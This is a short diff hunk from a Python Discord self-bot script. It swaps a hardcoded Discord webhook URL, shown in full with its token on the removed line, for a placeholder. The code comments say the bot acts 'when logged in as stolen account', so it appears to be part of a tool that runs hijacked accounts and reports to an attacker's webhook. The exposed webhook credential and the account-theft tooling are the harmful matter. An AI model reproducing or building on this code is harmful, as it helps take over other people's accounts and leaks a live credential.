@@ -17,7 +17,7 @@ colorno = 0xe74c3c
 client = discord.Client()
 client = commands.Bot(description='github.com/hum4not', command_prefix="notrequired", self_bot=True)
 #webhook(change url to ur one)
-webhook = "https://discord.com/api/webhooks/908769901144060035/MfC1HmrAp63Kx-bVKQuRTkxcfzUB_M-AliT80YKdjr7t1rzLUnNrETGmWpG5jvCxO8sg"
+webhook = "ur webhook"
 #client event (do things when logged in as stolen account)
 @client.event
 async def on_ready():
